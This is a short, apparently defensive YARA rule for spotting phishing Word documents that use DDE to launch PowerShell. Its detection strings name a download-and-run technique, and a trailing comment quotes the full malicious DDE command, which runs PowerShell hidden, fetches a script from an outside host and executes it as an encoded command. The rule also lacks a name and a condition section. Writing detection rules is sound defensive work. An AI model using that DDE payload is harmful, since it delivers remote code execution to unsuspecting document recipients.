rule {  
    meta:
        author = "manb4t"
        desc = "phishing email rule focussing on powershell and DDE"
    strings:
        $header = "[Content_Types].xml<?xml version"
        $s1 = "(New-Object System.Net.WebClient).DownloadString"
        $s2 = "powershell -enc $e # \" \"a slow internet connection\" \"try again later\""
        $s3 = "MSWord.exe\\\\..\\\\..\\\\..\\\\..\\\\"
        $s4 = "\\\\..\\\\..\\\\..\\\\Windows\\\\System32"
        $d1 = "2017-10-27T22:23:00Z"
        $d2 = "2017-10-27T22:25:00Z"
}






/*
DDE "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://sendmevideo.org/dh2025e/eee.txt');powershell -enc $e # " "a slow internet connection" "try again later"

/